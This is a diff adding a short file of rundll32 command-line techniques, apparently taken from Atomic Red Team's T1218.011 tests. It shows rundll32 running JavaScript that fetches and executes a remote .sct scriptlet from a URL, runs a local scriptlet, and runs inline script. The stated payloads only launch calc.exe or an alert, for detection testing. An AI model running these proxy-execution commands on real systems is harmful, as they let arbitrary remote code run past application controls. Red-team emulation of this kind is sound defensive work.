@@ -1,0 +1,18 @@
+# Rundll32 JavaScript Protocol
+# Source: Atomic Red Team (T1218.011)
+# https://github.com/redcanaryco/atomic-red-team
+
+# Method 1: Execute remote SCT file via rundll32
+# This technique leverages rundll32 to execute JavaScript from a remote .sct file
+rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.011/src/T1218.011.sct")
+
+# Method 2: Execute local SCT file
+# See rundll32_calc.sct for a local example payload
+rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:rundll32_calc.sct")
+
+# Method 3: Rundll32 with local JavaScript execution
+rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";alert('Atomic Red Team');
+
+# Note: The .sct (scriptlet) files contain JScript that will be executed
+# The provided rundll32_calc.sct example launches calc.exe for testing
+
